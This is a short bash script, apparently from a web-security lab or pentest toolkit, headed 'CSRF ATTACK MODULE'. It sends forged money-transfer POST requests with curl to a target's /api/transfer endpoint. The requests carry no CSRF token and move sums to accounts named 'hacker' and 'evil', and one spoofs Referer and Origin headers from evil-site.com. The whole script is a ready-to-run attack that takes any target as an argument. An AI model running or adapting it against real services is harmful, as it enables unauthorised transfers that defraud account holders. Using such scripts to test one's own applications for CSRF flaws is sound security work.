#!/bin/bash
TARGET="$1"

echo "========================================="
echo "[*] CSRF ATTACK MODULE"
echo "[*] Target: $TARGET"
echo "[*] Tool: curl"
echo "========================================="

echo ""
echo "[*] Phase 1: Forged transfer requests (no CSRF token)"
echo "---"

echo "[>] Simulated CSRF: Transfer \$9999 to 'hacker'"
curl -s -X POST "$TARGET/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{"to_user":"hacker","amount":"9999","simulate_csrf":true}'
echo ""

echo "[>] Simulated CSRF: Transfer \$5000 to 'attacker'"
curl -s -X POST "$TARGET/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{"to_user":"attacker","amount":"5000","simulate_csrf":true}'
echo ""

echo "[>] Forged request without CSRF token: Transfer \$1337 to 'evil'"
curl -s -X POST "$TARGET/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{"to_user":"evil","amount":"1337"}'
echo ""

echo "[>] Forged request without CSRF token: Transfer \$2500 to 'malicious_user'"
curl -s -X POST "$TARGET/api/transfer" \
  -H "Content-Type: application/json" \
  -d '{"to_user":"malicious_user","amount":"2500"}'
echo ""

echo ""
echo "[*] Phase 2: Demonstrating external origin attack"
echo "---"

echo "[>] Request with spoofed Referer header"
curl -s -X POST "$TARGET/api/transfer" \
  -H "Content-Type: application/json" \
  -H "Referer: http://evil-site.com/attack.html" \
  -H "Origin: http://evil-site.com" \
  -d '{"to_user":"hacker","amount":"7777","simulate_csrf":true}'
echo ""

echo ""
echo "========================================="
echo "[+] CSRF attack module complete"
echo "========================================="
